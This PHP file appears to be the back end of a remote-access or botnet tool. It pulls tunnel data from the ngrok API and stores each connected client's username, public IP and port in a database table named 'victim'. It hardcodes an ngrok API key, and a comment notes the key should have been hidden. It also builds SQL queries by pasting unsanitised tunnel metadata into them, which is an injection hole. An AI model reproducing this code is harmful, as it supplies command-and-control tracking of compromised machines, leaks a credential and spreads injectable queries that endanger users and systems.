<?php
require 'connect.php';
function splitPortIP($fullAddress){
    $address_array = explode(":", $fullAddress);
    $ip = trim($address_array[1], '/');
    $return_array = array($ip,$address_array[2]);
    return $return_array;
}
// gets the Ip for a session
$url = "https://api.ngrok.com/tunnels";
// api key for ngrok - should have hidden from GitHub
$apiKey = "2Bsvp9toxwuGHwk3lkyNJYZRugE_27CncnazyBQBXs7LacBAz";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
    "Authorization: Bearer ".$apiKey,
    "Ngrok-Version: 2",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);


$resp = curl_exec($curl);
curl_close($curl);

$data = json_decode($resp, true);

//gets the Metadata (username stored)
$url = "https://api.ngrok.com/tunnel_sessions";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
    "Authorization: Bearer ".$apiKey,
    "Ngrok-Version: 2",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
$resp = curl_exec($curl);

$dataTwo = json_decode($resp, true);

foreach ($data['tunnels'] as $tunnel) {
    foreach ($dataTwo['tunnel_sessions'] as $session) {
        if ($session['id'] == $tunnel['tunnel_session']['id']) {

            //check if user already has connected before
            $sql = "SELECT * FROM victim WHERE UserName='".$session['metadata']."'";
            $result = $conn->query($sql);
            if ($result->num_rows > 0) { // if connected before
                //updates IP of connected client
                $sql = "UPDATE victim SET CurrentIP ='".splitPortIP($tunnel['public_url'])[0]."', CurrentPort=".splitPortIP($tunnel['public_url'])[1]." WHERE UserName='".$session['metadata']."'";
                $result = $conn->query($sql);

                $conn->close();
            }
            else{
                // adds user to database
                echo "poopypants";
                $sql = "INSERT INTO victim VALUES(NULL,'".$session['metadata']."', '".splitPortIP($tunnel['public_url'])[0]."', ".splitPortIP($tunnel['public_url'])[1].")";
                $result = $conn->query($sql);

                $conn->close();
            }

        }
    }
}


